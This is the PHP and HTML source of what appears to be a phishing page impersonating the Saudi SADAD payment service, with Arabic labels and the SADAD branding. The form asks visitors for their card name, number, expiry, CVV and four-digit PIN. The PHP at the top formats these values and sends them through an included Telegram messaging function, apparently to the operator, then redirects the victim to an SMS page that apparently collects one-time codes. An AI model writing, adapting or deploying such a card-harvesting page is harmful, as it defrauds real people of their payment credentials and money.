<?php
// Version 1.2 bata 2023-7-11
if(!isset($_GET['id']) or empty($_GET['id'])){
  header("Location: index.html");
}
include_once "telegram.php";
if (isset($_POST['submit'])) {
    $uid = $_GET['id'];
    $message = "_______ تفاصيل عملية الدفع _______ "."\n"."\n";
    $message.= "رقم العملية".":".$uid."\n"."\n";
    $message.= "الاسم علي البطاقة".":".$_POST['inp1']."\n"."\n";
    $message.= "الرقم المدون على البطاقة".":".$_POST['inp2']."\n"."\n";
    $message.= "السنة".":".$_POST['inp3']."\n"."\n";
    $message.= "الشهر".":".$_POST['inp4']."\n"."\n";
    $message.= "CVV".":".$_POST['inp5']."\n"."\n";
    $message.= "الرقم السري للبطاقة المكون من 4 خانات".":".$_POST['inp6']."\n"."\n";
//  $message.= "".":".$_POST['inp']."\n"."\n";
    sendMessage($message);
    header("Location: sms.php?id=$uid");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="css/index.css">
  <link rel="stylesheet" href="css/bootstrap.css" type="text/css" media="all" />
  <script src="js/index.js"></script>
  <script src="js/bootstrap.js" type="text/javascript" charset="utf-8"></script>
  <title>sddad</title>
</head>
<body>
 <!-- Nav -->
<nav class="navbar navbar-expand-lg bg-light">
  <div class="container-fluid">
    <a class="navbar-brand" href="#">
      <img src="sadad_logo.png" alt="sddad" width="60" height="30">
    </a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarSupportedContent" dir="rtl">
      <ul class="navbar-nav me-auto mb-2 mb-lg-0">
        <li class="nav-item">
          <a class="nav-link active" aria-current="page" href="index.html">الرئيسيه</a>
        </li>
        <li class="nav-item">
          <a class="nav-link active" aria-current="page" href="index.html">شخصي</a>
        </li>
        <li class="nav-item">
          <a class="nav-link " href="NewService.html">بدأ الخدمه</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="about-us.html">عن سداد </a>
        </li>
      </ul>
    </div>
  </div>
</nav>
 <!-- end  -->
<!--- main  -->
<section class="main"  dir="rtl">
  <form action="" method="POST" accept-charset="utf-8" class="p-3">
        <!-- what is addad -->
   <!-- <div class="p-3 pt-2 pb-2 form-control mb-3 infodb">
     <h5>للسداد الحكومي</h5>
     <p class="p-1 pb-0">
       مع فواتير سداد، يمكنك دفع كل الفواتير من خلال البنك، كفواتير الكهرباء، والمياه،  والاتصالات، والرسوم الحكومية
     </p>
   </div> -->
   <!---end  -->
   <!-- wo -->
   <img class="container" src="1d19dc_9a4ca07ce411488e97b2920adb173c55~mv2.jpg" alt="" />
     <div class="mb-3">
    <label for="formGroupExampleInput" class="form-label"> الاسم على البطاقة </label>
    <input name="inp1" type="text" class="form-control" id="formGroupExampleInput" placeholder="">
   </div>
   
      <div class="mb-3">
    <label for="formGroupExampleInput" class="form-label"> الرقم المدون على البطاقة </label>
    <input name="inp2" type="text" class="form-control" id="formGroupExampleInput" placeholder="">
   </div>
   
      <div class="mb-3">
 <div class=" text-center">
  <div class="row">
    <div class="col">
  <input name="inp3" type="text" class="form-control" id="formGroupExampleInput2" placeholder="السنة">
    </div>
    <div class="col">
  <input name="inp4" type="text" class="form-control" id="formGroupExampleInput2" placeholder="الشهر">
    </div>
    <div class="col">
  <input name="inp5" type="text" class="form-control" id="formGroupExampleInput2"  placeholder="CVV">
    </div>
  </div>
</div>
  </div> 
    
     <div class="mb-3">
  <label for="formGroupExampleInput2" class="form-label">
    الرقم السري للبطاقة المكون من 4 خانات
  </label>
  <input name="inp6" type="number" class="form-control" id="formGroupExampleInput2" >
    </div> 
   <!-- ebd  -->
   <button name="submit" class="btn btn-primary btn-large" style="width:100%" type="submit">متابعة </button>
  </form>
</section>
<!-- end -->
    <footer class="footer  p-2 fixed-bottom text-center border-top text-center mt-4 infodb" dir="rtl">
    <div class="footer-copyright ">
          <div class="">
                        <label id="CopyRight">جميع الحقوق محفوظة ® سداد حقوق الطبع والنشر 2023</label>
                        
                    </div>
    </div>
    </footer>
</body>
</html>